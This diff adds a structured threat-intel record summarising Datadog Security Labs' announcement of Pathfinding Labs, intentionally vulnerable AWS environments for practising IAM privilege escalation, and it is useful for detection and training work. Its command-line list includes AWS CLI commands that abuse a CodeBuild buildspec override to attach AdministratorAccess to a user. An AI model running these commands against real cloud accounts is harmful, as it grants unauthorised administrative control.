@@ -1,0 +1,46 @@
+title: Introducing Pathfinding Labs - Deployable AWS IAM Privilege Escalation Environments
+description: Datadog Security Labs introduces Pathfinding Labs, a collection of intentionally
+  vulnerable AWS environments for testing AWS IAM privilege escalation techniques
+  and CSPM misconfigurations. The project includes over 100 deployable Terraform-based
+  labs and a Go CLI binary for enabling, deploying, and exploiting cloud misconfigurations.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes: []
+  command_lines:
+  - aws iam list-users --max-items 1
+  - aws codebuild list-projects --region us-east-1 --query 'projects[*]' --output
+    json
+  - aws codebuild batch-get-projects --region us-east-1 --names "pl-prod-codebuild-002-to-admin-existing-project"
+    --output json
+  - ? aws codebuild start-build --region us-east-1 --project-name "pl-prod-codebuild-802-to-admin-existing-project"
+      --buildspec-override "version
+    : 0.2\nphases:\n  build:\n    commands:\n      - echo \"Starting privilege escalation
+      via buildspec override...\"\n      - aws iam attach-user-policy --user-name
+      pl-prod-codebuild-802-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+  - aws iam attach-user-policy --user-name pl-prod-codebuild-802-to-admin-starting-user
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+  powershell: []
+  scripts:
+  - demo_attack.sh
+  registry_keys: []
+  image_loads: []
+  network_connections: []
+  file_activity:
+  - ~/.plabs/
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - pathfinding[.]cloud
+  urls:
+  - hxxps://pathfinding[.]cloud/labs
+  - hxxps://github[.]com/DataDog/pathfinding-labs
+authors:
+- Datadog Security Labs
+reference: https://securitylabs.datadoghq.com/articles/introducing-pathfinding-labs
+date_of_publication: May 18, 2026
+file_creation_date: May 22, 2026
